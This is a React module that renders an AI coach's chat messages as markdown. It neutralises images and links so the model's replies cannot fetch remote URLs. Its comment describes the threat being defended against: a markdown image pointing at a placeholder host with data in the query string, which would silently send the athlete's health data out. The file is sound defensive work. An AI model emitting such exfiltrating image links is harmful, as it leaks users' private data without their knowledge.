import type { Components } from 'react-markdown'

/**
 * How the coach's message body is rendered as markdown.
 *
 * Headings become plain paragraphs so the chat keeps one font size.
 *
 * `img` and `a` render inert (#677). react-markdown renders no raw HTML
 * without `rehype-raw`, so this was never an XSS question — it is an egress
 * one. A rendered `![](https://host/?d=…)` fetches that URL the moment the
 * message paints, with no click and nothing visible to the athlete, and the
 * coach prompt carries the athlete's health data by construction (#499). Since
 * the LLM has no tool-calling, a remote reference in its reply is the *only*
 * way text the model produces can leave the browser. The CSP in `nginx.conf`
 * is the second, independent layer.
 *
 * Nothing is lost by this: the coach's citations do not come through markdown
 * at all — they arrive structured on `msg.sources` and are rendered as real
 * links in `AIChat`. So there is no legitimate reason for a link or an image in
 * the message body, and the alt/label text is kept so nothing disappears
 * silently either.
 *
 * It lives in its own module rather than in `AIChat.tsx` so the egress
 * guarantee can be tested without standing up the chat component and its
 * mocks — and because exporting a non-component from a component file breaks
 * fast refresh.
 */
export const MARKDOWN_COMPONENTS: Components = {
  h1: 'p',
  h2: 'p',
  h3: 'p',
  h4: 'p',
  h5: 'p',
  h6: 'p',
  img: ({ alt }) => (
    <span className="text-gray-400 italic">{alt ? `[image: ${alt}]` : '[image]'}</span>
  ),
  a: ({ href, children }) => (
    <span>
      {children}
      {href ? <span className="text-gray-400"> ({href})</span> : null}
    </span>
  ),
}
